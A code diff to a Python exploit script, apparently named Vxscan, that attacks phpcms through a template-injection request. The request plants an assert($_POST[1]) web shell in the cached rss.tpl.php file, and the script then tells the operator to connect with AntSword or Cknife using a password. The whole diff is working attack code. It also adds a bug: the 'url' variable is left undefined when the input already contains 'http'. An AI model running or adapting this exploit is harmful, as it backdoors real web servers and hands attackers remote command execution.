@@ -1,7 +1,6 @@
 #coding:utf-8
 
 import requests
-import hashlib
 import sys
 import argparse
 import pyfiglet
@@ -13,7 +12,7 @@ import os
 def options():
     parser = argparse.ArgumentParser(description='Vxscan V1.0')
     parser.add_argument('-u','--url',help='vulnable target url')
-    parser.add_argument('-c','--code',help='phpcode')
+    parser.add_argument('-p','--password',help='antsword or ckinfe connect password')
     
     args = parser.parse_args()
 
@@ -23,18 +22,18 @@ def options():
         print('\033[94m[*]starting exploit!\033[0m')
         geturl=args.url
         if 'http' not in geturl:
-            geturl='http://'+args.url
-        geturl=geturl+'/phpcms/type?templat=tag_()%7B%7D;@unlink(FILE);assert($_POST%5B%27code%27%5D);%7B//../rss'
+            url='http://'+args.url
+        geturl=url+'/phpcms/type?templat=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss'
         r1=requests.get(url=geturl)
         
-        tesurl=args.url+'/phpcms/data/cache_template/rss.tpl.php'
+        testurl=url+'/phpcms/data/cache_template/rss.tpl.php'
         r2=requests.get(url=testurl)
         if r2.status_code==200:
             print("\033[92mSucessful!!\033[0m")
-            if args.code:
-                print("please try \""+args.url+'/phpcms/data/cache_template/rss.tpl.php?cmd='+args.code+'\" to test!!')
+            if args.password:
+                print("please connect by using antsword or cknife with password [\033[92m"+args.password+'\033[0m]to test!!')
             else:
-                print("please try \""+args.url+'/phpcms/data/cache_template/rss.tpl.php?code=yourcode\" to test!!')
+                print("please connect by using antsword or cknife with password [\033[92m1\033[0m] to test!!")
         else:
             print("\033[91mFailed\033[0m")
     else:
